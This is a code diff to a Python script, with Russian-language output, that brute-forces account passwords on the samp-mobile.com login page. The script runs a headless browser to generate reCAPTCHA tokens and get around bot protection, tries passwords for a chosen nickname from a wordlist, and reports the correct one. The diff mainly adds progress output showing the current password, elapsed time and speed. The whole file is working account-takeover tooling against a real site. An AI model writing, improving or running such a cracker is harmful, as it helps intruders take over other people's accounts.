@@ -3,21 +3,20 @@ import aiohttp
 import asyncio
 import json
 import time
+import os
+
 from selenium import webdriver
 
 
 async def main():
 	session = aiohttp.ClientSession()
 
-	driver = webdriver.PhantomJS(executable_path='resources/phantomjs.exe')
-	driver.get('https://samp-mobile.com/account/')
-
 	settings = open('settings.json')
 	settings = settings.read()
 	settings = json.loads(settings)
 
-	open('status.json', 'w').write('{"time": "", "speed": "", "current-password": "", "password": ""}')
-
+	driver = webdriver.PhantomJS(executable_path=settings['files'][1]['path'])
+	driver.get('https://samp-mobile.com/account/')
 	userName = settings['nickname']
 	base = open(settings['files'][0]['path'])
 	base = base.read()
@@ -31,7 +30,7 @@ async def main():
 			workTime = time.time() - startTime
 			workSpeed = id / workTime
 		except:
-			pass
+			workSpeed = 0
 		while True:
 			driver.execute_script("grecaptcha.ready(function() {grecaptcha.execute('6LfhuPcUAAAAAPTrbOFLnwQMXDbkTrwDeZ6xodrO', {action: 'homepage'}).then(function(token) {document.getElementById('g-recaptcha-response').value=token;});});")
 			g_recaptcha_response = driver.find_element_by_id('g-recaptcha-response')
@@ -52,11 +51,13 @@ async def main():
 				continue
 			else:
 				if status == 'ok':
-					print(f'Верный пароль: {userPassword}')
+					os.system('cls')
+					print(f'\rВерный пароль: {userPassword}')
 					input()
 					exit()
 				else:
-					print(f'Текущий пароль: {userPassword}')
+					os.system('cls')
+					print(f'\rТекущий пароль: {userPassword}\nВремя: {int(workTime)}\nСкорость: {int(workSpeed)}')
 					break
 
 loop = asyncio.get_event_loop()
